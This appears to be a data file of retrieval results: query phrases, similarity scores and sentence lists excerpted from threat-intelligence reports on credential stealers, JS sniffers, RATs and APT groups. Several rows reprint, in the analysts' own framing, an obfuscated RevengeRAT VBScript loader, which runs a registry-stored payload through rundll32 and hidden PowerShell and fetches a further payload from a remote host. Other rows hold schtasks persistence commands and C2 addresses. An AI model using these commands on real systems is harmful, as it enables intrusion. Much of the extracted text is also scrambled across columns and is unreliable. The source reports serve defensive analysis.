brute-force attacks|0.919489165300007|['The script, which is loaded by many sites, JS sniffers can be installed by obtaining would load a bank card JS sniffer along access to a websites administrator panel with itself.', 'with permission to edit files.', 'The login and password can be compromised through This type of malware delivery can result several methods: in rival sniffer families being hacked.', 'For stealers, i.e.', 'programs that extract instance, during one wave of infections, passwords saved in browsers; the operators of the WebRank sniffer gained access to the MagentoName malware for intercepting entered data JS sniffer code and added their malicious (including logins and passwords); code to it.', 'brute force.', 'Another example is the attack on Feedify, a real-time push notification service.', 'Hacking of third-party services By injecting the JS sniffer code into A sniffer can infiltrate a website through the code of a given file, the threat hacked third-party services, whose actor automatically uploaded the scripts work on the target website: JS sniffer to all Feedify customers, Hacking websites that provide and their sites were infected with the services for online stores (customer feedbackembad-min-1.0.js script.', 'The support chats or analytics and sniffer was injected into the Feedify statistics systems).', 'By injecting code on August 17, and was detected malicious code into the service and removed on September 11.', 'However, script code, a JS sniffer infiltrates the intruders infected the website again the code of online store websites.']
brute-force attacks|0.7520045300287646|['sensitive data, and manipulate the applications Security Review: Regularly review BaaS functionality.', 'configurations to identify and address Insecure APIs: Even with authentication in place, misconfigurations promptly.', 'Automated APIs can remain vulnerable if they fail to adhere to configuration scanning tools can significantly security best practices.', 'For example, insufficient streamline the review process.', 'These tools input validation exposes the application to injection can scan BaaS configurations for common attacks, improper error handling can result in misconfigurations, vulnerabilities, and deviations information leakage, and inadequate rate limiting from security best practices.', 'facilitates brute-force attacks.', 'Misconfigurations: BaaS providers offer significant flexibility in configuration, but this can inadvertently lead to misconfigurations that compromise the datas security.', 'For example, overly permissive access controls and misconfigured storage settings can all contribute to data exposure.', '12Threat Horizons Threat Actors Experimenting with Serverless Cloud Services to Distribute Malware Serverless architectures are attractive to developers Google Cloud Run and Cloud Functions are services and enterprises for their flexibility, cost effectiveness, provided by Google for building and deploying web and ease of use.', 'These same features make services.', 'Some threat actors take advantage of the serverless computing services for all cloud providers platforms flexibility and ease of deployment, which attractive to threat actors, who use them to deliver is intended to ensure users experience is favorable.']
uploaded to the command-and-control (C&C) server,|0.7968672510055972|"['Additionally, a file named [random].zip is created to store browser data and Recent cache.', 'FakeCheck targets the user data of Chrome and Edge browsers, including plugin settings, browsing history, bookmarks, and saved password information.', 'It collects this data and adds it to a zip file.', 'FakeCheck also retrieves the Recent file cache.', '9/13The collected data is recorded in the files C:\\\\Users\\\\Public\\\\Pictures[random].txt and C:\\\\Users\\\\Public\\\\Pictures[random].zip.', 'These files are then uploaded to the command and control (C&C) server.', 'FakeCheck receives data from the command and control (C&C) server.', 'When the received data does not contain the phrase ""Fatal error,"" it proceeds to parse the commands and execute them accordingly.', 'The received instructions are segmented using the ""|"" character.', 'The final command is executed as a cmd command line 10/13The execution results of the cmd command are sent back to the command and control (C&C) server using the ""POST"" method.', '3.']"
stealer,|0.8878918698624777|['We believe that MoustachedBouncer uses a lawful interception system (such as SORM) to conduct its AitM operations.', 'We assess with low confidence that MoustachedBouncer is closely cooperating with Winter Vivern, another group targeting European diplomats but using different TTPs.', 'Since 2014, the group has been operating a malware framework that we have named NightClub.', 'It uses the SMTP and IMAP (email) protocols for C&C communications.', 'Starting in 2020, the group has been using, in parallel, a second malware framework we have named Disco.', 'Both NightClub and Disco support additional spying plugins including a screenshotter, an audio recorder, and a file stealer.', 'Victimology According to ESET telemetry, the group targets foreign embassies in Belarus, and we have identified four different countries whose embassy staff have been targeted: two from Europe, one from South Asia, and one from Africa.', 'The key dates are shown in Figure 1.', '1/20Figure 1.', 'Timeline of MoustachedBouncer activities Attribution While we track MoustachedBouncer as a separate group, we have found elements that make us assess with low confidence that they are closely collaborating with another group known as Winter Vivern.', 'The latter was discovered in 2021 and is still active as of 2023.']
stealer,|0.7534931645558102|"[""It's likely target is the Tencent QQ chat application."", 'File stealer.', 'Has a configuration file that enables the collection of files from different sources: HDDs, sebasek.dll USB thumb drives, and CD-ROMs; as well as criteria based on the file properties: filename must contain a keyword from a predefined list, file size must be between a defined a minimum and maximum size.', 'Captures text copied to the clipboard and logs information from the USBSTOR registry Cbmrpa.dll key.', 'pRsm.dll Captures input and output audio streams.', 'Credential stealer.', 'mailLFPassword.dll Steals credentials from Outlook and Foxmail email client software.', 'Credential stealer.', 'agentpwd.dll Steals credentials from Chrome, Opera, Firefox, Foxmail, QQBrowser, FileZilla, and WinSCP, among others.', 'A complex plugin designed to steal the content from the Tencent QQ database that qmsdp.dll stores the users message history.', 'This is achieved by in-memory patching of the software component KernelUtils.dll and dropping a fake userenv.dll DLL.']"
stealer,|0.8878918698624777|"['It is important to note that the plugins dont have unique internal identification numbers; therefore we are identifying them here by their DLL names on disk, which we have never seen change.', 'Table 2.', 'List of plugin DLL files Plugin DLL name Overview Keylogger.', 'Kstrcs.dll It only actively logs keystrokes when the foreground window belongs to a process named QQ.exe and the window title matches QQEdit.', ""It's likely target is the Tencent QQ chat application."", 'File stealer.', 'Has a configuration file that enables the collection of files from different sources: HDDs, sebasek.dll USB thumb drives, and CD-ROMs; as well as criteria based on the file properties: filename must contain a keyword from a predefined list, file size must be between a defined a minimum and maximum size.', 'Captures text copied to the clipboard and logs information from the USBSTOR registry Cbmrpa.dll key.', 'pRsm.dll Captures input and output audio streams.', 'Credential stealer.', 'mailLFPassword.dll Steals credentials from Outlook and Foxmail email client software.']"
stealer,|0.7721234235093856|"[']org, and they have engaged in website defacements under the group name AjaxTM since 2010.', 'By 2014, the Ajax Security Team had transitioned from performing defacements (their last defacement was in December 2013) to malware-based espionage, using a methodology consistent with other advanced persistent threat actors in this region.', '(Crowdstrike) CrowdStrike Intelligence has also been tracking and reporting internally on this threat group since mid-January 2014 under the name FLYING KITTEN, and since that time has seen targeting of multiple U.S.-based defense contractors as well as political dissidents.', 'Observed Sectors: Defense and dissidents.', 'Countries: USA.', 'Tools used Stealer.', 'Operations 2013 Operation Saffron Rose performed <https://www.fireeye.com/content/dam/fireeye-www/global/en/current- threats/pdfs/rpt-operation-saffron-rose.pdf> Information <https://www.crowdstrike.com/blog/cat-scratch-fever-crowdstrike-tracks-newly- reported-iranian-actor-flying-kitten/> 138Threat Group Cards: A Threat Actor Encyclopedia FunnyDream Names FunnyDream (Kaspersky) Country China Motivation Information theft and espionage First seen 2018 Description In early 2020 Kaspersky published a report based on its investigation of an ongoing attack campaign called FunnyDream.', 'This Chinese-speaking actor has been active for at least a few years and possesses different implants with various capabilities.', 'Since mid-2018, researchers at Kaspersky saw continuing high activity from this threat actor and among their targets were a number of high-level government organisations as well as some political parties from various Asian countries including the Philippines, Thailand, Vietnam, and Malaysia.', 'The campaign comprises a number of cyber espionage tools with various capabilities.', ""As of the latest monitoring of the global cybersecurity company, FunnyDream's espionage attacks are still ongoing.""]"
download|0.7875417477258988|['For any inquiries about this service, visit the ESET Threat Intelligence page.', 'IoCs SHA-1 Filename ESET detection name D 69AB6B9906F8DCE03B43BEBB7A07189A69DC507B coreclr.dll Win32/Agent.ADMW Korp Dec 10AE4784D0FFBC9CD5FD85B150830AEA3334A1DEN/A Win32/Korplug.TC (dum mem 69AB6B9906F8DCE03B43BEBB7A07189A69DC507B coreclr.dll Win32/Agent.ADMW Korp 4EBFC035179CD72D323F0AB357537C094A276E6D PowerDVD18.exe Win32/Delf.UTN Korp Dec FDBB16B8BA7724659BAB5B2E1385CFD476F10607 N/A Win32/Korplug.TB (dum mem Dec 7E059258CF963B95BDE479D1C374A4C300624986 N/A Win32/Korplug.TC (dum mem 7992729769760ECAB37F2AA32DE4E61E77828547 SHELLSEL.ocx Win32/Agent.ADMW Korp F05E89D031D051159778A79D81685B62AFF4E3F9 SymHp.exe Win32/Delf.UTN Korp AB01E099872A094DC779890171A11764DE8B4360 BoomerangLib.dll Win32/Korplug.TH Korp CDB15B1ED97985D944F883AF05483990E02A49F7 PotPlayer.dll Win32/Agent.ADYO Korp 908F55D21CCC2E14D4FF65A7A38E26593A0D9A70 SmadHook32.dll Win32/Agent.ADMW Korp 477A1CE31353E8C26A8F4E02C1D378295B302C9E N/A Win32/Agent.ADMW Korp 52288C2CDB5926ECC970B2166943C9D4453F5E92 SmadHook32c.dll Win32/Agent.ADMW Korp CBD875EE456C84F9E87EC392750D69A75FB6B23A SHELLSEL.ocx Win32/Agent.ADMW Korp 2CF4BAFE062D38FAF4772A7D1067B80339C2CE82 Adobe_Caps.dll Win32/Agent.ADMW Korp 97C92ADD7145CF9386ABD5527A8BCD6FABF9A148DocConvDll.dll Win32/Agent.ADYO Korp Dec 39863CECA1B0F54F5C063B3015B776CDB05971F3 N/A Win32/Korplug.TD (dum mem Vuln legit 0D5348B5C9A66C743615E819AEF152FB5B0DAB97 FontEDL.exe clean File exec Vuln legit Micr C8F5825499315EAF4B5046FF79AC9553E71AD1C0 Silverlight.Configuration.execlean Silve Con Utilit Vuln legit D4FFE4A4F2BD2C19FF26139800C18339087E39CD PowerDVDLP.exe clean Pow exec Vuln legit 65898ACA030DCEFDA7C970D3A311E8EA7FFC844ASymantec.exe clean Sym AntiV exec Vuln Adobe Stock Photos legit 7DDB61872830F4A0E6BF96FAF665337D01F164FC clean CS3.exe Stoc exec 10/13SHA-1 Filename ESET detection name D COVID-19 travel restrictions C13D0D669365DFAFF9C472E615A611E058EBF596 EU reviews list of third Win32/Agent_AGen.NJ Dow countries.exe REGULATION OF THE EUROPEAN PARLIAMENT 062473912692F7A3FAB8485101D4FCF6D704ED23 Win32/TrojanDownloader.Agent.GDLDow AND OF THE COUNCIL.exe 2B5D6BB5188895DA4928DD310C7C897F51AAA050 log.dll Win32/Agent.ACYW Korp 511DA645A7282FB84FF18C33398E67D7661FD663 2.exe Win32/Agent.ADPL Korp 59002E1A58065D7248CD9D7DD62C3F865813EEE6 log.dll Win32/Agent.ADXE Korp F67C553678B7857D1BBC488040EA90E6C52946B3 KINGSTON.exe Win32/Agent.ADXZ Korp Vuln 58B6B5FD3F2BFD182622F547A93222A4AFDF4E76 PotPlayer.exe clean legit exec Network Domain IP First seen Notes 103.56.53[.', ']120 20210615Korplug C&C 154.204.27[.', ']181 20201005Korplug C&C.', '43.254.218[.', ']42 20210209Download server.', '45.131.179[.', ']179 20201005Korplug C&C.', '176.113.69[.', ']91 2021-04-19Korplug C&C.', 'upespr[.']
download|0.8131127079314292|"['Command file tool The malware waits in an endless loop for the file C:\\\\Windows\\\\Temp\\\\TMPA93840.tmp to appear.', 'Once found, it reads the first line of the file and checks if it begins with one of the command keywords listed below.', 'After that, the malware immediately deletes the command file.', 'The following command keywords are supported: Command Description zip Handler for this command is not implemented Upload file.', 'Send to specified server SSL/DTLS encrypted message in following form: POST /upload HTTP/1.1 Host: %host%:%port% Content-Length: 1254 Origin: https://%host%:%port% Content-Type: multipart/form-data; boundary=---- WebKitFormBoundary%16randomAlphaNum% ------WebKitFormBoundary%16randomAlphaNum% up Content-Disposition: form-data; name=""Upload"" 100000 ------WebKitFormBoundary%16randomAlphaNum% Content-Disposition: form-data; name=""Upload""; filename=""{%timestamp%- %4randomDigits%.dmp}"" Content-Type: application/x-object ------WebKitFormBoundary%16randomAlphaNum%-- The reply for the request is line specifying name, starting offset, full size, chunk size, sleep time between chunks of the file to be uploaded to server.', 'Download file.', 'Send to specified server SSL/DTLS encrypted message in following form: POST /download HTTP/1.1 dn Host: %host%:%port% Content-Length: 1254 Origin: https://%host%:%port% Content-Type: multipart/form-data; boundary=---- WebKitFormBoundary%16randomAlphaNum% 29 2023 AO KASPERSKY LAB------WebKitFormBoundary%16randomAlphaNum% Content-Disposition: form-data; name=""Download"" 100000 ------WebKitFormBoundary%16randomAlphaNum% Content-Disposition: form-data; name=""download""; filename=""{%timestamp%- %4randomDigits%.dmp}"" Content-Type: application/x-object ------WebKitFormBoundary%16randomAlphaNum%-- The reply for the request is line specifying name, full size, chunk size, sleep time between chunks of the file to be downloaded from the server.', 'bb Exit The malware records every executed command in an informative log file: C:\\\\Windows\\\\Temp\\\\TMPB08634.tmp.', ""Analyzing this log file tells us that a malicious C2 server was deployed within the victim's LAN."", 'According to timestamps this tool was compiled just a few minutes before its usage.', '{2022-10-13 10:08} [INFO] CMD_FILE C:\\\\Windows\\\\Temp\\\\TMPA93840.tmp {2022-10-13 10:08} ================================================================== {2022-10-13 10:08} [READING CMD] ... {2022-10-13 10:08} [DELETE] CMD_FILE {2022-10-13 10:08} [UP] 192.168.']"
download|0.7749727914195083|['After it is installed and started, the JPIN service can perform the following tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on.', 'List running services, processes, job IDs, and task IDs.', 'Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keylogger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.', 'Exfiltrate information over HTTP GET and POST requests, with the data stored either within the HTTP body or within the URL parameters.', 'Lower security settings by tampering with registry keys.', 'Inject content into the lsass.exe process, in order to load the keylogger module into lsass and call its exported function.']
download|1.0|"['commands onany portusing any protocol.', 'The RAT can not only access and query Before attempting communications to the databases but can also enumerate the networks to command and control server, the malware checks which the infected computer is connected, set up for network connectivity.', ""It does this by using the network connections, modify the registry, lock the workstation'sscreen,controlprocessesandservices 34Polymorphicprograms canbemodified (ormodifythemselves) tohaveadifferentfilehash and/orsizewhileretainingthesame 33SQLinstructions areused toquerycertaintypesofdatabases functionality."", 'This facilitates code reuse by making signature and obtaininformationfromthem.', 'based detectionmoredifficult.', 'PAGE6OF 24 COPYRIGHT COMMANDFIVEPTY LTD.ALLRIGHTSRESERVED.legitimate Microsoft Windows domain by theattackersto disguisethem asbeingassociated download.windowsupdate.com.', 'This legitimate with NateOn an Instant Messaging Service owned domain is hardcoded into the malware but may be by SK Communications.', 'Legitimate files developed overridden by modifying the malwares by SK Communicationsarealso knownby thename configuration.', ""nateon.exe'37."", 'Having determined there is network THEMALICIOUSINFRASTRUCTURE connectivity, the malware establishes Callback domains are translated to IP addresses communications with the callback domain using the Domain Name System (DNS)38protocol.', ""nateon.duamlive.com'35on TCP port 80 (configured This translatesthedomaininto auniqueaddresson as noted previously).""]"
download|0.8248804100287882|['nifty-login .', 'com domain .', 'nifty-user .', 'com server .', 'universityexp .', 'com download .', 'yourturbe .', 'org services .', 'google-config .', 'com dunya .', '8800 .']
download|0.8458339111141505|"[']240.86.200:5651 Hosts: Mikael LLC (administrator@mikael-company[.', ']ru) George Alan Developments Incorporated C:\\\\windows\\\\system32\\\\wbem\\\\wmic.exe process where ExecutablePath=\'C:\\\\\\\\ProgramData\\\\\\\\lsass.exe\' delete C:\\\\windows\\\\system32\\\\wbem\\\\wmic.exe process where ExecutablePath=\'C:\\\\\\\\ProgramData\\\\\\\\svchost.exe\' delete C:\\\\windows\\\\system32\\\\schtasks.exe /delete /tn ""Network Security Update"" /f C:\\\\windows\\\\system32\\\\schtasks.exe /create /sc onstart /tn ""Network Security Update"" /tr ""C:\\\\ProgramData\\\\lsass.exe"" /en SYSTEM %PROGRAMDATA%\\\\lsass.exe %PROGRAMDATA%\\\\svchost.exe %PROGRAMDATA%\\\\config.xml %PUBLIC%\\\\output.exe %APPDATA%\\\\dnsoption.exe %APPDATA%\\\\Microsoft\\\\Windows\\\\CDSSyncReporting.exe Additional information 3/4 It is recommended to change the so-called attack surface (attack surface), including for filtering mesh ports for external information flows.', 'With the method of revealing the facts of tunneling information flows behind the additional DNS protocol, perform rechecking and further monitoring of the log files for the presence of anomalous DNS backlogs.', 'Implement the possibility of centralized management of anti-virus protection on all non-powered computers; transfer the ability to live on computers (launching Yara-rules, accessing shkdlvh files, searching for indicators then), in the first line, in remote access mode.', 'Graphic images Rice.', '1 Download free download 4/4']"
download|0.778546256441084|['Fortunately, there are numerous companies that actively scan the uploaded libraries to identify possible malware.', 'When malicious packages are found, they often consist of information stealers (shocker).', 'Figure 45.', 'Malicious npm packages by Social Engineering technique 78 If these creds were doughnuts, the hot and fresh sign would still be on.', '79 Bet you cant guess what coding environments the DBIR team uses :p 80 Same as this report: If you got this PDF or printed issue from a friend, please go to verizon.com/ dbir and download a copy for yourself.', 'Download early, download often!', '81 https://www.npmjs.com/about 82 Were afraid there are no cheat codes to get money.', 'Microtransactions for live-service games function the other way around.', '2024 DBIR Incident Classification Patterns 45Lastly, there were also packages that CIS targeted what we (and a few people smarter than we are) believe are Controls for dependency confusion attacks.', 'In these types of attacks, the attackers take consideration advantage of how some tooling checks for packages on public repositories before it checks for private ones.', 'If the Mitigating against stolen attackers know that organizations are using the library super-cool-internal- credentials library, which is stored in their internal repository, the attackers can create Account Management [5] a library on a public repository called Establish and Maintain an super-cool-internal-library and the Inventory of Accounts [5.1] tooling may check the public repo Disable Dormant Accounts [5.3] first before looking at the internal ones.']
API hashing|0.8268176987279865|['T1055 Process Injection ShadowPad is injected into a wmplayer.exe process.', 'T1140 Deobfuscate/Decode ShadowPad launcher uses XOR to decrypt Files or Information the payload.', 'ShadowPad uses a custom algorithm to decrypt strings and configuration.', 'T1027 Obfuscated Files or ShadowPad shellcode is XOR-encoded Information and uses fake conditional jumps to hinder disassembly.', 'ShadowPads strings and configuration are encrypted.', 'It also uses API hashing.', 'T1143 Hidden Window ShadowPad is injected into a wmplayer.exe process started in a hidden window.', 'Discovery T1010 Application Window ShadowPads keylogging module lists Discovery application windows.', 'T1083 File and Directory ShadowPads RecentFiles module lists Discovery files recently accessed.', '10/11Tactic ID Name Description Command T1071 Standard Application ShadowPad can use HTTP and HTTPS for and Layer Protocol C&C communications.', 'Control T1043 Commonly Used ShadowPad uses TCP:443 and UDP:443.']
retrieves the MachineGuid of the infected system from the SOFTWARE\Microsoft\Cryptography\MachineGuid registry key|0.7731671613745444|"['In fact, all communication between the Trojan and C2 could be viewed using an ordinary traffic sniffer.', 'Group-IB experts retrieved several JS commands that were executed on the infected device.', 'They were all designed to obtain information about an infected device.', 'They even included CMD commands (as described in the corresponding section).', ""Tools TinyFluff 6/17As mentioned above, Group-IB experts detected two versions of TinyFluff: Campaign date SHA1 2022-03-25 c82e12e563d5d5f4a8dd67703b5df7373b457abc 2022-03-22 bd0a6a3628f268a37ac9d708d03f57feef5ed55e Campaign date;SHA1 2022-03-25;c82e12e563d5d5f4a8dd67703b5df7373b457abc 2022-03- 22;bd0a6a3628f268a37ac9d708d03f57feef5ed55e Let's begin with the tf.exe file (SHA1: c82e12e563d5d5f4a8dd67703b5df7373b457abc) as the tool is much simpler than its predecessor."", 'Once launched, the application creates the directory %APPDATA%\\\\%MachineGuid%, where %MachineGuid% is the registry value for HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Cryptography\\\\MachineGuid.', 'If the directory already exists, the application terminates itself.', 'The application copies the interpreter Node.js (node.exe) and the malicious script s.txt to the created directory.', 'The script is heavily obfuscated, but if it can be run then there is no need to waste time on de-obfuscation because the obfuscated layer restarts Node.js and passes a ""clean"" script to it as an argument.', ""How Group-IB Managed XDR's module called Threat Hunting Framework Polygon displays the attack As seen in the screenshot, the argument of the second node.exe process is a script without obfuscation."", 'Its functionality is simple: it connects to the address 46.101.113[.']"
"retrieves the MachineGuid of the infected system from the ""SOFTWARE\Microsoft\Cryptography\MachineGuid"" registry key."|0.7731671613745444|"['In fact, all communication between the Trojan and C2 could be viewed using an ordinary traffic sniffer.', 'Group-IB experts retrieved several JS commands that were executed on the infected device.', 'They were all designed to obtain information about an infected device.', 'They even included CMD commands (as described in the corresponding section).', ""Tools TinyFluff 6/17As mentioned above, Group-IB experts detected two versions of TinyFluff: Campaign date SHA1 2022-03-25 c82e12e563d5d5f4a8dd67703b5df7373b457abc 2022-03-22 bd0a6a3628f268a37ac9d708d03f57feef5ed55e Campaign date;SHA1 2022-03-25;c82e12e563d5d5f4a8dd67703b5df7373b457abc 2022-03- 22;bd0a6a3628f268a37ac9d708d03f57feef5ed55e Let's begin with the tf.exe file (SHA1: c82e12e563d5d5f4a8dd67703b5df7373b457abc) as the tool is much simpler than its predecessor."", 'Once launched, the application creates the directory %APPDATA%\\\\%MachineGuid%, where %MachineGuid% is the registry value for HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Cryptography\\\\MachineGuid.', 'If the directory already exists, the application terminates itself.', 'The application copies the interpreter Node.js (node.exe) and the malicious script s.txt to the created directory.', 'The script is heavily obfuscated, but if it can be run then there is no need to waste time on de-obfuscation because the obfuscated layer restarts Node.js and passes a ""clean"" script to it as an argument.', ""How Group-IB Managed XDR's module called Threat Hunting Framework Polygon displays the attack As seen in the screenshot, the argument of the second node.exe process is a script without obfuscation."", 'Its functionality is simple: it connects to the address 46.101.113[.']"
payload through rundll32.exe|0.7781697804409394|"['Visual Basic Script hidden behind the web page Its funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities: 3/11Update Copyright: Microsoft Corp.', 'This script is designed to be used only for scheduled tasks(s).', 'There is no extensive error check, and will not dump the output from the Powershell CmdLet.', 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)} These comments are in fact part of the SyncAppvPublishingServer utility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions: Store a base64 encoded version of the RevengeRAT payload into registry key located at HKCU\\\\AppEvents\\\\Values CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ"" Decode and execute of the stored payload Set A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get- ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHide Create and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs, capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']br Set XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t("""" [af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHide 4/11Finally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
payload through rundll32.exe|0.7781697804409394|"[']com shormanz[.', ']com verofes[.', ']com : 2/3rundll32 C:\\\\Windows\\\\Tasks\\\\pe.dll,DllRegisterServer C:\\\\Windows\\\\Tasks\\\\pe.dll : 1.', '(EXCEL.EXE, WINWORD.EXE )  (, rundll32.exe, wscript.exe ).', ""2.    '"", 'rundll32.exe.', ': 3/3']"
payload through rundll32.exe|0.7781697804409394|"['Home page of the Blogger drop urlBut a deeper inspection of its source code reveals an interesting snippet inserted into an invisible blog post: this ghost article contains VBScript code.Figure 4.', ""Visual Basic Script hidden behind the web pageIts funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities:'Update---------------------------------------------------------------------------------------------' Copyright: Microsoft Corp.'' This script is designed to be used only for scheduled tasks(s).'"", ""There is no extensive error check, and will not dump the output from the Powershell CmdLet.''"", 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)}These comments are in fact part of the SyncAppvPublishingServerutility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions:Store a base64 encoded version of the RevengeRAT payload into registry key located at""HKCU\\\\AppEvents\\\\Values""CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ""Decode and execute of the stored payloadSet A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get-ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHideCreate and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs,capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']brSet XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t(""""[af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHideFinally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
payload through rundll32.exe|0.7781697804409394|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
Enumerate files on desktop|0.781459107621894|"['Nodachi: A previously unknown set of plugins uti- lized by SideCopy were calling Nodachi.', 'These Golang-based plugins have reconnaissance and file-stealing abilities targeting an Indian multi-factor authentication app known as Kavach.', 'RAT ANALYSIS CETARAT CetaRAT is a C#-based RAT family first seen in the wild since 2019.', 'Its malicious capabilities (Figure 8) include: Execution: Download and run arbitrary executables and commands.', 'Figure 8: CetaRAT command codes.', 'File management: Upload, download, delete, rename and enumerate files.', 'Capture: Take screenshots and monitor clipboard data.', 'Processes: List or kill processes on the endpoint.', '2021 Cisco.', 'All rights reserved.', 'talos-external@cisco.com | talosintelligence.com page 9 of 23InSideCopy: How this APT continues to evolve its arsenal DETARAT DetaRAT is a previously unknown C#-based implant used by SideCopy.']"
The attackers enumerate drives, directories, and files|0.8109420317577825|['Move Files.4.', 'Enumerate Open Ports.5.', 'Enumerate Drives.6.', 'Enumerate Processes by ID, Name, or Privileges.7.', 'Start and Stop Processes.8.', 'Enumerate Files and Directories.9.', 'Open a Named Pipe and Send and Receive Data.10.', 'Take Screenshots.11.', 'Inject into User Processes.12.', 'Enumerate Services.13.', 'Start/Stop Services.14.']
